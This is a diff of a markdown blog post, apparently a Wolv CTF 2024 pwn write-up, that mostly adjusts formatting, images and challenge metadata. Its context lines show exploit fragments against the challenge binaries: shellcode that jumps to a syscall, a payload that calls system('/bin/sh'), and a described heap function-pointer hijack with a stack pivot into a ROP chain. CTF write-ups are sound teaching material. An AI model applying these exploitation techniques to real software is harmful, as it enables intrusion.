@@ -1,15 +1,15 @@
 ---
 title: Wolv CTF 2024 pwn writeup
-date: 03-21-2024 4:10 PM
+date: 03-21-2024 1:32 PM
 summary: Pwn challenges writeup from Wolv CTF 2024. The Pwn challenges were beginner friendly with an interesting challenge CScript. 
 tags:
 - rop
 - fmt
 ---
 
-# Wolv CTF 2024
 Our team ranked #1st place in this CTF. 
-![enter image description here](https://i.imgur.com/ZCDrjlx.png)And yes i designed this scoreboard :joy: 
+<Image alt="WolvCTF 2024 Scooreboard" src="/static/images/WolvCTF2024/scoreboard_wolv.jpeg" width={400} height={400} />
+And yes i designed this scoreboard :joy: 
 
 During the CTF i managed to solve the following pwn challenges
 <TOCInline toc={props.toc} exclude="References" toHeading={2} />
@@ -108,8 +108,8 @@ payload = asm("""
     cdq
     push 0x00000000401000; pie base+0x1000
     pop rcx
-    add rcx, 0x19; 				 offset
-    jmp rcx; 							 do syscall
+    add rcx, 0x19;         offset
+    jmp rcx;               do syscall
 
 """)
 
@@ -294,6 +294,21 @@ sl(b"/bin/sh\x00" + b"A"*208 + p(libc.sym.system)); Call system with /bin/sh
 io.interactive()
 ```
 ## CString
+
+- **Description** : Scripting done right.
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/Wolv2024/CStringdaf)
+- **Solves** : 4
+- **Points** : 500
+
+### Checksec
+
+<div dangerouslySetInnerHTML={{ __html: `<pre>    Arch:     amd64-64-little
+    RELRO:    <font color="#FFD7B1">Partial RELRO</font>
+    Stack:    <font color="#87C38A">Canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x400000)</font></pre>` }} />
+
+
 This was a statically compiled c++ binary(hard). The bug was interesting and my team mates @IceCreamMan and @rycbar did the most part. They found the bug understood it and triggered it and IceCreamMan shared the PoC.
 
 He did a good job with fuzzing and reversing this. Meanwhile even i wrote a custom fuzzer got a lot of crashed but got skill issued and wasnt able to understand the root cause of the bug. :joy: 
@@ -367,7 +382,9 @@ sla(b'>>', file_content)
 file_content = b"Print(a)"
 sla(b'>>', file_content)
 ```
-The binary crashes here with `0x4141414141414141` in RAX. So the decompilation says that if we have a valid `heap_obj->func_ptr` then we proceed to call that. So i used this for the exploitation since it also take a argument from the heap_obj. We can now craft a fake heap_obj which func_ptr points to a pointer to `xchg eax, esp; ret` gadget and argument to the address of our ROP chain. The address of RDI and RAX is same so we can use eax as well instead of edi for stack pivot.
+The binary crashes here with `0x4141414141414141` in RAX.
+<Image alt="WolvCTF 2024 Scooreboard" src="/static/images/WolvCTF2024/CScript_bug.png" width={400} height={400} />
+So the decompilation says that if we have a valid `heap_obj->func_ptr` then we proceed to call that. So i used this for the exploitation since it also take a argument from the heap_obj. We can now craft a fake heap_obj which func_ptr points to a pointer to `xchg eax, esp; ret` gadget and argument to the address of our ROP chain. The address of RDI and RAX is same so we can use eax as well instead of edi for stack pivot.
 
 ### Exploit
 ```py
@@ -425,3 +442,5 @@ sla(b'>>', payload)
 
 io.interactive()
 ```
+
+
